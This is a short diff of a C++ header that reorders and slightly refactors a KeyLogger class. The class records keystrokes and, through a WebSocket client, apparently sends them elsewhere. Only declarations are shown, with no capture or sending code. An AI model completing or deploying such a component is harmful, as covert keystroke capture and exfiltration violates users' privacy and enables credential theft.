@@ -1,4 +1,3 @@
-#include "websocket_client.hpp"
 #include <nlohmann/json.hpp>
 #include <string>
 #include <vector>
@@ -7,7 +6,15 @@
 #include <mutex>
 #include <map>
 
+class WebSocketClient;
+
 class KeyLogger {
+public:
+    explicit KeyLogger(WebSocketClient& ws_client);
+    ~KeyLogger();
+    void start();
+    void stop();
+
 private:
     std::atomic<bool> running{ false };
     std::vector<std::string> keystrokes;
@@ -19,10 +26,4 @@ private:
 
     void log_keystrokes();
     void send_keystrokes();
-
-public:
-    KeyLogger(WebSocketClient& ws_client);
-    ~KeyLogger();
-    void start();
-    void stop();
 };
